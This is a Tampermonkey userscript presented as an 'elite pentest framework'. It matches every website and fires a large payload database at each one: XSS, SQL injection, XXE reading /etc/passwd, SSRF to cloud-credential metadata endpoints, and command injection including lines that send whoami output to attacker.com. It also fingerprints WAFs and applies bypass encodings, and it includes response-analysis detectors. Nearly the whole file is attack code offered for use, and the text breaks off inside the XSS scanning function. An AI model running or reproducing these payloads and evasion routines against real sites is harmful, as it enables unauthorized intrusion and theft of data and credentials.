// ==UserScript==
// @name         Advanced Elite Pentest Framework 2025 - Professional Edition
// @namespace    http://tampermonkey.net/
// @version      11.0.0
// @description  Advanced Multi-Vector Security Testing Framework with False Positive Reduction
// @author       Elite Security Team 2025
// @match        https://*/*
// @match        http://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_xmlhttpRequest
// @grant        GM_openInTab
// @grant        GM_download
// @grant        unsafeWindow
// @connect      *
// @run-at       document-start
// ==/UserScript==

(function() {
  'use strict';

  // ════════════════════════════════════════════════════════════════════════════
  // 🎯 ADVANCED CONFIGURATION SYSTEM
  // ════════════════════════════════════════════════════════════════════════════

  const CONFIG = {
    VERSION: '11.0.0',
    
    // Storage Keys
    STORAGE: {
      CONFIG: 'elite_adv_config',
      RESULTS: 'elite_adv_results',
      QUEUE: 'elite_adv_queue',
      WAF_FINGERPRINTS: 'elite_adv_waf',
      SESSION: 'elite_adv_session'
    },

    // Testing Parameters
    TESTING: {
      MAX_THREADS: 3,
      REQUEST_TIMEOUT: 15000,
      PAYLOAD_DELAY: 500,
      MAX_RETRIES: 2,
      CONFIDENCE_THRESHOLD: 70,
      RESPONSE_TIME_BASELINE: 3000,
      BLIND_DELAY_THRESHOLD: 5000
    },

    // Detection Settings
    DETECTION: {
      FALSE_POSITIVE_CHECKS: true,
      CONTEXT_ANALYSIS: true,
      BEHAVIORAL_ANALYSIS: true,
      TIME_BASED_DETECTION: true,
      ERROR_BASED_DETECTION: true,
      CONTENT_DIFF_ANALYSIS: true
    },

    // Attack Vectors
    VECTORS: {
      XSS: true,
      SQLI: true,
      XXE: true,
      SSRF: true,
      IDOR: true,
      LFI: true,
      RCE: true,
      SSTI: true,
      CRLF: true,
      OPEN_REDIRECT: true,
      JWT_ATTACKS: true,
      GRAPHQL: true,
      NOSQL_INJECTION: true,
      LDAP_INJECTION: true,
      XPATH_INJECTION: true
    },

    // WAF/Security Detection
    SECURITY: {
      WAF_DETECTION: true,
      RATE_LIMIT_DETECTION: true,
      CAPTCHA_DETECTION: true,
      CSP_ANALYSIS: true,
      CORS_ANALYSIS: true,
      SECURITY_HEADERS: true
    },

    // Advanced Features
    ADVANCED: {
      POLYGLOT_PAYLOADS: true,
      ENCODING_BYPASS: true,
      MUTATION_FUZZING: true,
      RACE_CONDITIONS: true,
      PARAMETER_POLLUTION: true,
      PROTOTYPE_POLLUTION: true,
      DESERIALIZATION: true
    }
  };

  // ════════════════════════════════════════════════════════════════════════════
  // 🔬 ADVANCED PAYLOAD DATABASE (Top 0.1% Techniques)
  // ════════════════════════════════════════════════════════════════════════════

  const PAYLOADS = {
    XSS: {
      // Context-aware payloads with validation markers
      html_context: [
        '<img src=x onerror="window.__xss_confirmed=1;alert(document.domain)">',
        '<svg/onload="window.__xss_confirmed=1;alert(document.domain)">',
        '<iframe src="javascript:window.parent.__xss_confirmed=1;alert(document.domain)">',
        '<details open ontoggle="window.__xss_confirmed=1;alert(document.domain)">',
        '<marquee onstart="window.__xss_confirmed=1;alert(document.domain)">'
      ],
      
      attribute_context: [
        '" onmouseover="window.__xss_confirmed=1;alert(document.domain)" x="',
        '\' onmouseover=\'window.__xss_confirmed=1;alert(document.domain)\' x=\'',
        '"><img src=x onerror="window.__xss_confirmed=1;alert(document.domain)">',
        '\'/><script>window.__xss_confirmed=1;alert(document.domain)</script>'
      ],

      script_context: [
        '\';window.__xss_confirmed=1;alert(document.domain);//',
        '\";window.__xss_confirmed=1;alert(document.domain);//',
        '</script><script>window.__xss_confirmed=1;alert(document.domain)</script>',
        '-window.__xss_confirmed=1;alert(document.domain)-'
      ],

      // Modern bypass techniques
      waf_bypass: [
        '<img src=x onerror="(window[\'al\'+\'ert\'])(document[\'dom\'+\'ain\'])">',
        '<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;document.domain&#41;</script></svg>',
        '<iframe srcdoc="&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;">',
        '<img src=x onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\'))">',
        '<math><mtext><script>alert(document.domain)</script></mtext></math>',
        '<form><button formaction="javascript:alert(document.domain)">X</button></form>',
        '<input autofocus onfocus="self[`ale`+`rt`](document.domain)">',
        '<video><source onerror="alert(document.domain)">'
      ],

      // Polyglot payloads
      polyglot: [
        'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"> * alert(1)//\'',
      ],

      // DOM-based XSS
      dom_based: [
        '#<img src=x onerror=alert(document.domain)>',
        'javascript:void(window.__xss_confirmed=1);void(alert(document.domain))',
        'data:text/html,<script>alert(document.domain)</script>',
        'vbscript:msgbox(document.domain)'
      ]
    },

    SQLI: {
      // Error-based detection
      error_based: [
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES LIMIT 1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
      ],

      // Time-based blind SQLi with verification
      time_based: [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "'; BENCHMARK(5000000,MD5(1))--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--"
      ],

      // Boolean-based blind
      boolean_based: [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND SUBSTRING(VERSION(),1,1)='5",
        "' AND LENGTH(DATABASE())>0--",
        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64--"
      ],

      // Union-based
      union_based: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
      ],

      // Polyglot SQLi
      polyglot: [
        "SLEEP(5)/*' XOR SLEEP(5) OR '\"XOR SLEEP(5) OR \"*/",
        "1' OR SLEEP(5)# OR '1'='1",
        "IF(1=1,SLEEP(5),0)/*' XOR IF(1=1,SLEEP(5),0) OR '\"XOR IF(1=1,SLEEP(5),0) OR \"*/"
      ],

      // NoSQL Injection
      nosql: [
        "' || '1'=='1",
        "' && '1'=='1",
        "' || 1==1//",
        "' || 1==1%00",
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$regex\":\".*\"}",
        "[$ne]=1",
        "[$regex]=.*",
        "' || 'a'=='a",
        "{$where: 'sleep(5000)'}"
      ]
    },

    XXE: {
      basic: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/xxe">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root/>',
      ],
      
      // Blind XXE
      blind: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://attacker.com/?data=%data;\'>">%param1;]><root>&exfil;</root>'
      ]
    },

    SSRF: {
      basic: [
        'http://localhost',
        'http://127.0.0.1',
        'http://0.0.0.0',
        'http://[::1]',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/v1/'
      ],

      // Bypass filters
      bypass: [
        'http://127.1',
        'http://127.0.1',
        'http://2130706433',
        'http://0177.0.0.1',
        'http://0x7f.0x0.0x0.0x1',
        'http://localtest.me',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
        'http://[0:0:0:0:0:ffff:127.0.0.1]',
        'http://①②⑦.⓪.⓪.①'
      ],

      // Cloud metadata endpoints
      cloud: [
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
      ]
    },

    LFI: {
      basic: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '/etc/passwd',
        'C:\\windows\\win.ini',
        'file:///etc/passwd'
      ],

      // Null byte injection
      null_byte: [
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',
        '../../../etc/passwd\x00'
      ],

      // Encoding bypass
      encoded: [
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252F..%252F..%252Fetc%252Fpasswd',
        '....//....//....//etc/passwd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd'
      ],

      // PHP wrappers
      wrappers: [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'php://filter/read=string.rot13/resource=index.php',
        'expect://id',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'zip://archive.zip#shell.php'
      ]
    },

    RCE: {
      basic: [
        '; whoami',
        '| whoami',
        '& whoami',
        '`whoami`',
        '$(whoami)',
        '; sleep 5',
        '| sleep 5',
        '& sleep 5 &'
      ],

      // Blind RCE with delay
      blind: [
        '; ping -c 5 127.0.0.1',
        '| ping -n 5 127.0.0.1',
        '& timeout /t 5',
        '`sleep 5`',
        '$(sleep 5)',
        '; curl http://attacker.com?data=$(whoami)',
        '| nslookup $(whoami).attacker.com'
      ],

      // Encoding bypass
      encoded: [
        '%3B%20whoami',
        '%7C%20whoami',
        '%26%20whoami',
        ';%20wh%6F%61mi',
        '|%20wh%6F%61mi'
      ]
    },

    SSTI: {
      jinja2: [
        '{{7*7}}',
        '{{config}}',
        '{{self}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
      ],

      freemarker: [
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'
      ],

      velocity: [
        '#set($x=7*7)$x',
        '#set($s=$class.inspect("java.lang.Runtime").type.getRuntime())$s.exec("whoami")'
      ],

      thymeleaf: [
        '${7*7}',
        '${T(java.lang.Runtime).getRuntime().exec("whoami")}'
      ]
    },

    CRLF: [
      '%0d%0aSet-Cookie: admin=true',
      '%0d%0aLocation: http://attacker.com',
      '%0d%0a%0d%0a<script>alert(document.domain)</script>',
      '\r\nSet-Cookie: admin=true',
      '\r\nLocation: http://attacker.com'
    ],

    OPEN_REDIRECT: [
      '//attacker.com',
      '///attacker.com',
      '////attacker.com',
      'https://attacker.com',
      'javascript:alert(document.domain)',
      '//google.com@attacker.com',
      '/\\attacker.com',
      '//@attacker.com',
      'https:attacker.com',
      '//attacker.com%2F..',
      '///attacker.com/%2F..'
    ],

    IDOR: {
      numeric: ['1', '2', '999', '1000'],
      uuid: ['00000000-0000-0000-0000-000000000000'],
      username: ['admin', 'administrator', 'root', 'user']
    }
  };

  // ════════════════════════════════════════════════════════════════════════════
  // 🧪 RESPONSE ANALYZER - Advanced False Positive Reduction
  // ════════════════════════════════════════════════════════════════════════════

  class ResponseAnalyzer {
    constructor() {
      this.baselineResponses = new Map();
      this.errorSignatures = this.initErrorSignatures();
    }

    initErrorSignatures() {
      return {
        sqli: [
          /SQL syntax.*?MySQL/i,
          /Warning.*?mysql_/i,
          /MySQLSyntaxErrorException/i,
          /PostgreSQL.*?ERROR/i,
          /Warning.*?pg_/i,
          /SQLite3::SQLException/i,
          /ORA-\d{5}/i,
          /Microsoft SQL Server/i,
          /ODBC SQL Server Driver/i,
          /SQLServer JDBC Driver/i,
          /Oracle error/i,
          /Unclosed quotation mark/i,
          /quoted string not properly terminated/i,
          /You have an error in your SQL syntax/i,
          /mysql_fetch/i,
          /mysql_num_rows/i,
          /pg_query\(\)/i,
          /pg_exec\(\)/i,
          /supplied argument is not a valid MySQL/i
        ],

        xxe: [
          /java\.io\.FileNotFoundException/i,
          /java\.net\.MalformedURLException/i,
          /org\.xml\.sax\.SAXParseException/i,
          /root:.*?:0:0:/,
          /\[boot loader\]/i,
          /\[fonts\]/i
        ],

        path_traversal: [
          /root:.*?:0:0:/,
          /\[boot loader\]/i,
          /\[fonts\]/i,
          /\[extensions\]/i,
          /<\?php/i,
          /Warning.*?failed to open stream/i,
          /No such file or directory/i
        ],

        rce: [
          /uid=\d+\([^)]+\) gid=\d+\([^)]+\)/,
          /root:.*?:0:0:/,
          /www-data/i,
          /sh: .*?: command not found/i,
          /PING.*?bytes of data/i
        ],

        ssti: [
          /TemplateSyntaxError/i,
          /UndefinedError/i,
          /jinja2\.exceptions/i,
          /freemarker\.template/i,
          /velocity\.exception/i
        ]
      };
    }

    /**
     * Capture baseline response for comparison
     */
    async captureBaseline(url, method = 'GET', data = null) {
      try {
        const response = await this.makeRequest(url, method, data);
        const key = `${method}:${url}`;
        
        this.baselineResponses.set(key, {
          status: response.status,
          length: response.body.length,
          headers: response.headers,
          time: response.time,
          body: response.body,
          hash: this.hashResponse(response.body)
        });

        return response;
      } catch (error) {
        console.error('Baseline capture failed:', error);
        return null;
      }
    }

    /**
     * Analyze response for vulnerability indicators with confidence scoring
     */
    analyzeResponse(response, payload, vulnerabilityType, baseline = null) {
      const result = {
        vulnerable: false,
        confidence: 0,
        indicators: [],
        falsePositive: false,
        evidence: []
      };

      // Check for error-based indicators
      if (CONFIG.DETECTION.ERROR_BASED_DETECTION) {
        const errorCheck = this.checkErrorSignatures(response.body, vulnerabilityType);
        if (errorCheck.found) {
          result.indicators.push('error_signature');
          result.confidence += 40;
          result.evidence.push(...errorCheck.matches);
        }
      }

      // Time-based analysis
      if (CONFIG.DETECTION.TIME_BASED_DETECTION && vulnerabilityType === 'sqli') {
        if (this.isTimingAnomaly(response, baseline)) {
          result.indicators.push('timing_anomaly');
          result.confidence += 35;
          result.evidence.push(`Response time: ${response.time}ms (baseline: ${baseline?.time || 'N/A'}ms)`);
        }
      }

      // Content difference analysis
      if (CONFIG.DETECTION.CONTENT_DIFF_ANALYSIS && baseline) {
        const diff = this.calculateContentDifference(response.body, baseline.body);
        if (diff.significant) {
          result.indicators.push('content_difference');
          result.confidence += 20;
          result.evidence.push(`Content diff: ${diff.percentage}%`);
        }
      }

      // XSS-specific checks
      if (vulnerabilityType === 'xss') {
        const xssCheck = this.verifyXSSExecution(response.body, payload);
        if (xssCheck.confirmed) {
          result.indicators.push('xss_confirmed');
          result.confidence += 50;
          result.evidence.push(xssCheck.context);
        } else if (xssCheck.reflected) {
          result.indicators.push('xss_reflected');
          result.confidence += 20;
          
          // Check if it's in executable context
          if (xssCheck.executableContext) {
            result.confidence += 30;
            result.evidence.push('Reflected in executable context');
          } else {
            result.evidence.push('Reflected but not in executable context');
            result.falsePositive = true;
          }
        }
      }

      // SQLi-specific checks
      if (vulnerabilityType === 'sqli') {
        const sqliCheck = this.verifySQLInjection(response, payload, baseline);
        if (sqliCheck.confirmed) {
          result.indicators.push('sqli_confirmed');
          result.confidence += 50;
          result.evidence.push(...sqliCheck.evidence);
        }
      }

      // False positive checks
      if (CONFIG.DETECTION.FALSE_POSITIVE_CHECKS) {
        const fpCheck = this.checkFalsePositives(response, payload, vulnerabilityType);
        if (fpCheck.isFalsePositive) {
          result.falsePositive = true;
          result.confidence -= 40;
          result.evidence.push('False positive detected: ' + fpCheck.reason);
        }
      }

      // Final verdict
      result.vulnerable = result.confidence >= CONFIG.TESTING.CONFIDENCE_THRESHOLD && !result.falsePositive;

      return result;
    }

    /**
     * Verify XSS execution with context analysis
     */
    verifyXSSExecution(responseBody, payload) {
      const result = {
        confirmed: false,
        reflected: false,
        executableContext: false,
        context: ''
      };

      // Check if payload is reflected
      if (!responseBody.includes(payload)) {
        return result;
      }

      result.reflected = true;

      // Find context of reflection
      const contexts = this.findPayloadContexts(responseBody, payload);

      for (const context of contexts) {
        // Check if in executable context
        if (context.type === 'script') {
          result.executableContext = true;
          result.context = 'JavaScript context';
          
          // Check if outside of string
          if (!context.inString) {
            result.confirmed = true;
          }
        } else if (context.type === 'attribute' && context.isEventHandler) {
          result.executableContext = true;
          result.confirmed = true;
          result.context = 'Event handler attribute';
        } else if (context.type === 'html' && payload.match(/<[^>]+>/)) {
          result.executableContext = true;
          result.confirmed = true;
          result.context = 'HTML injection';
        }
      }

      return result;
    }

    /**
     * Find all contexts where payload appears
     */
    findPayloadContexts(html, payload) {
      const contexts = [];
      const escapedPayload = payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const regex = new RegExp(escapedPayload, 'g');
      let match;

      while ((match = regex.exec(html)) !== null) {
        const pos = match.index;
        const before = html.substring(Math.max(0, pos - 100), pos);
        const after = html.substring(pos + payload.length, Math.min(html.length, pos + payload.length + 100));

        // Detect context type
        let context = { type: 'text', inString: false, isEventHandler: false };

        // Check if inside script tag
        if (/<script[^>]*>/i.test(before) && !</script>/i.test(before.split(/<script[^>]*>/i).pop())) {
          context.type = 'script';
          
          // Check if inside string
          const scriptContent = before.split(/<script[^>]*>/i).pop();
          const singleQuotes = (scriptContent.match(/'/g) || []).length;
          const doubleQuotes = (scriptContent.match(/"/g) || []).length;
          context.inString = (singleQuotes % 2 === 1) || (doubleQuotes % 2 === 1);
        }
        // Check if inside HTML attribute
        else if (/<[^>]*$/test(before) && /[^<]*>/.test(after)) {
          context.type = 'attribute';
          
          // Check if event handler
          const attrMatch = before.match(/\s+(on\w+)\s*=\s*["']?[^"']*$/i);
          if (attrMatch) {
            context.isEventHandler = true;
          }
        }
        // Check if inside HTML tag
        else if (/>\s*$/.test(before) && /\s*</.test(after)) {
          context.type = 'html';
        }

        contexts.push(context);
      }

      return contexts;
    }

    /**
     * Verify SQL injection with multiple techniques
     */
    verifySQLInjection(response, payload, baseline) {
      const result = {
        confirmed: false,
        evidence: []
      };

      // Error-based SQLi
      if (this.checkErrorSignatures(response.body, 'sqli').found) {
        result.confirmed = true;
        result.evidence.push('SQL error message detected');
      }

      // Time-based blind SQLi
      if (payload.match(/SLEEP|WAITFOR|BENCHMARK/i)) {
        if (response.time > CONFIG.TESTING.BLIND_DELAY_THRESHOLD) {
          result.confirmed = true;
          result.evidence.push(`Time-based SQLi confirmed (${response.time}ms delay)`);
        }
      }

      // Boolean-based blind SQLi
      if (baseline && payload.match(/AND ['"]?1['"]?=['"]?[12]/i)) {
        const isTrue = payload.includes("='1") || payload.includes("=1");
        const lengthDiff = Math.abs(response.body.length - baseline.body.length);
        
        if (isTrue && lengthDiff < 100) {
          result.evidence.push('Boolean-based SQLi: TRUE condition matches baseline');
        } else if (!isTrue && lengthDiff > 100) {
          result.confirmed = true;
          result.evidence.push('Boolean-based SQLi: FALSE condition differs from baseline');
        }
      }

      // Union-based SQLi
      if (payload.match(/UNION.*SELECT/i)) {
        const columnCount = (payload.match(/NULL/g) || []).length;
        if (response.body.length > (baseline?.body.length || 0) + 100) {
          result.confirmed = true;
          result.evidence.push(`Union-based SQLi: Response size increased with ${columnCount} columns`);
        }
      }

      return result;
    }

    /**
     * Check for error signatures in response
     */
    checkErrorSignatures(responseBody, vulnerabilityType) {
      const result = { found: false, matches: [] };
      
      const signatures = this.errorSignatures[vulnerabilityType] || [];
      
      for (const pattern of signatures) {
        const matches = responseBody.match(pattern);
        if (matches) {
          result.found = true;
          result.matches.push(matches[0].substring(0, 200));
        }
      }

      return result;
    }

    /**
     * Detect timing anomalies for blind injection
     */
    isTimingAnomaly(response, baseline) {
      if (!baseline || !baseline.time) return false;

      const diff = response.time - baseline.time;
      
      // If response is significantly slower than baseline
      return diff > CONFIG.TESTING.BLIND_DELAY_THRESHOLD;
    }

    /**
     * Calculate content difference percentage
     */
    calculateContentDifference(body1, body2) {
      if (!body2) return { significant: false, percentage: 0 };

      const len1 = body1.length;
      const len2 = body2.length;
      const diff = Math.abs(len1 - len2);
      const percentage = (diff / Math.max(len1, len2)) * 100;

      return {
        significant: percentage > 10,
        percentage: percentage.toFixed(2)
      };
    }

    /**
     * Check for false positives
     */
    checkFalsePositives(response, payload, vulnerabilityType) {
      const result = { isFalsePositive: false, reason: '' };

      // Check if response is an error page
      if (response.status >= 400) {
        if (vulnerabilityType === 'xss' || vulnerabilityType === 'sqli') {
          result.isFalsePositive = true;
          result.reason = `HTTP ${response.status} error page`;
          return result;
        }
      }

      // Check if payload is HTML-encoded
      const encodedPayload = this.htmlEncode(payload);
      if (response.body.includes(encodedPayload) && vulnerabilityType === 'xss') {
        result.isFalsePositive = true;
        result.reason = 'Payload is HTML-encoded (properly sanitized)';
        return result;
      }

      // Check if inside HTML comment
      if (vulnerabilityType === 'xss') {
        const commentPattern = /<!--[\s\S]*?-->/g;
        const comments = response.body.match(commentPattern) || [];
        for (const comment of comments) {
          if (comment.includes(payload)) {
            result.isFalsePositive = true;
            result.reason = 'Payload reflected inside HTML comment';
            return result;
          }
        }
      }

      // Check if WAF blocked the request
      if (this.isWAFBlocked(response)) {
        result.isFalsePositive = true;
        result.reason = 'Request blocked by WAF';
        return result;
      }

      return result;
    }

    /**
     * Check if request was blocked by WAF
     */
    isWAFBlocked(response) {
      const wafIndicators = [
        /cloudflare/i,
        /access denied/i,
        /forbidden/i,
        /security policy/i,
        /firewall/i,
        /mod_security/i,
        /imperva/i,
        /akamai/i
      ];

      if (response.status === 403 || response.status === 406) {
        for (const pattern of wafIndicators) {
          if (pattern.test(response.body) || pattern.test(response.headers)) {
            return true;
          }
        }
      }

      return false;
    }

    /**
     * HTML encode string
     */
    htmlEncode(str) {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    }

    /**
     * Hash response for comparison
     */
    hashResponse(body) {
      let hash = 0;
      for (let i = 0; i < body.length; i++) {
        const char = body.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      return hash;
    }

    /**
     * Make HTTP request
     */
    async makeRequest(url, method = 'GET', data = null, headers = {}) {
      return new Promise((resolve, reject) => {
        const startTime = Date.now();

        GM_xmlhttpRequest({
          method: method,
          url: url,
          data: data,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ...headers
          },
          timeout: CONFIG.TESTING.REQUEST_TIMEOUT,
          onload: (response) => {
            resolve({
              status: response.status,
              headers: response.responseHeaders,
              body: response.responseText,
              time: Date.now() - startTime
            });
          },
          onerror: (error) => {
            reject(error);
          },
          ontimeout: () => {
            reject(new Error('Request timeout'));
          }
        });
      });
    }
  }

  // ════════════════════════════════════════════════════════════════════════════
  // 🛡️ WAF DETECTOR & BYPASS ENGINE
  // ════════════════════════════════════════════════════════════════════════════

  class WAFDetector {
    constructor() {
      this.wafSignatures = this.initWAFSignatures();
      this.detectedWAF = null;
      this.bypassTechniques = this.initBypassTechniques();
    }

    initWAFSignatures() {
      return {
        cloudflare: {
          headers: ['cf-ray', 'cf-request-id'],
          body: ['cloudflare', 'cf-browser-verification'],
          status: [403, 503]
        },
        akamai: {
          headers: ['akamai-grn', 'akamai-origin-hop'],
          body: ['akamai', 'reference #'],
          status: [403]
        },
        aws_waf: {
          headers: ['x-amzn-requestid', 'x-amzn-errortype'],
          body: ['aws waf', 'request blocked'],
          status: [403]
        },
        imperva: {
          headers: ['x-iinfo'],
          body: ['imperva', 'incapsula'],
          status: [403]
        },
        f5_asm: {
          headers: ['x-cnection'],
          body: ['the requested url was rejected', 'support id'],
          status: [403, 406]
        },
        modsecurity: {
          headers: ['server'],
          body: ['mod_security', 'this error was generated by mod_security'],
          status: [403, 406]
        },
        wordfence: {
          headers: [],
          body: ['wordfence', 'generated by wordfence'],
          status: [403]
        }
      };
    }

    initBypassTechniques() {
      return {
        encoding: {
          url_encode: (payload) => encodeURIComponent(payload),
          double_url_encode: (payload) => encodeURIComponent(encodeURIComponent(payload)),
          unicode: (payload) => payload.split('').map(c => '\\u' + ('000' + c.charCodeAt(0).toString(16)).slice(-4)).join(''),
          hex: (payload) => payload.split('').map(c => '%' + c.charCodeAt(0).toString(16)).join(''),
          html_entities: (payload) => payload.split('').map(c => '&#' + c.charCodeAt(0) + ';').join('')
        },

        case_manipulation: {
          random_case: (payload) => payload.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),
          mixed_case: (payload) => payload.replace(/[a-z]/gi, c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase())
        },

        comment_injection: {
          mysql: (payload) => payload.replace(/\s+/g, '/**/'),
          multiline: (payload) => payload.replace(/\s+/g, '/*\n*/')
        },

        whitespace_manipulation: {
          tabs: (payload) => payload.replace(/\s+/g, '\t'),
          newlines: (payload) => payload.replace(/\s+/g, '\n'),
          mixed: (payload) => payload.replace(/\s+/g, () => [' ', '\t', '\n'][Math.floor(Math.random() * 3)])
        }
      };
    }

    async detect(url) {
      console.log('[WAF] Starting WAF detection...');

      const testPayloads = [
        '"><script>alert(1)</script>',
        "' OR '1'='1",
        '../../../etc/passwd'
      ];

      const results = new Map();

      for (const payload of testPayloads) {
        try {
          const response = await this.makeRequest(url + '?test=' + encodeURIComponent(payload));
          
          // Check each WAF signature
          for (const [wafName, signature] of Object.entries(this.wafSignatures)) {
            let score = 0;

            // Check headers
            for (const header of signature.headers) {
              if (response.headers.toLowerCase().includes(header.toLowerCase())) {
                score += 30;
              }
            }

            // Check body content
            for (const pattern of signature.body) {
              if (response.body.toLowerCase().includes(pattern.toLowerCase())) {
                score += 40;
              }
            }

            // Check status code
            if (signature.status.includes(response.status)) {
              score += 20;
            }

            if (score > 0) {
              results.set(wafName, (results.get(wafName) || 0) + score);
            }
          }
        } catch (error) {
          console.error('[WAF] Detection error:', error);
        }

        await this.sleep(CONFIG.TESTING.PAYLOAD_DELAY);
      }

      // Determine detected WAF
      if (results.size > 0) {
        const [detectedWAF, score] = [...results.entries()].sort((a, b) => b[1] - a[1])[0];
        if (score >= 50) {
          this.detectedWAF = detectedWAF;
          console.log(`[WAF] Detected: ${detectedWAF} (confidence: ${score}%)`);
          return { detected: true, waf: detectedWAF, confidence: score };
        }
      }

      console.log('[WAF] No WAF detected');
      return { detected: false };
    }

    applyBypass(payload, technique = 'auto') {
      if (technique === 'auto') {
        // Automatically select best bypass for detected WAF
        if (this.detectedWAF === 'modsecurity' || this.detectedWAF === 'f5_asm') {
          return this.bypassTechniques.encoding.double_url_encode(payload);
        } else if (this.detectedWAF === 'cloudflare') {
          return this.bypassTechniques.case_manipulation.random_case(payload);
        }
      }

      return payload;
    }

    async makeRequest(url, method = 'GET', data = null) {
      return new Promise((resolve, reject) => {
        GM_xmlhttpRequest({
          method: method,
          url: url,
          data: data,
          timeout: 10000,
          onload: (response) => {
            resolve({
              status: response.status,
              headers: response.responseHeaders,
              body: response.responseText
            });
          },
          onerror: reject,
          ontimeout: () => reject(new Error('Timeout'))
        });
      });
    }

    sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
  }

  // ════════════════════════════════════════════════════════════════════════════
  // 🎯 VULNERABILITY SCANNER ENGINE
  // ════════════════════════════════════════════════════════════════════════════

  class VulnerabilityScanner {
    constructor() {
      this.analyzer = new ResponseAnalyzer();
      this.wafDetector = new WAFDetector();
      this.results = [];
      this.baseline = null;
    }

    async initialize(url) {
      console.log('[SCANNER] Initializing scanner...');

      // Capture baseline response
      this.baseline = await this.analyzer.captureBaseline(url);

      // Detect WAF
      if (CONFIG.SECURITY.WAF_DETECTION) {
        await this.wafDetector.detect(url);
      }

      console.log('[SCANNER] Initialization complete');
    }

    async scanXSS(url, parameter, context = 'html_context') {
      console.log(`[XSS] Scanning ${parameter} in ${context}...`);

      const payloads = PAYLOADS.XSS[context] || PAYLOADS.XSS.html_context;
      const vulnerabilities = [];

      for (const payload of payloads) {
        try {
          // Apply WAF bypass if needed
          const processedPayload = this.wafDetector.detectedWAF 
            ? this.wafDetector.applyBypass(payload)
            : payload;

          // Build test URL
          const testUrl = new URL(url);
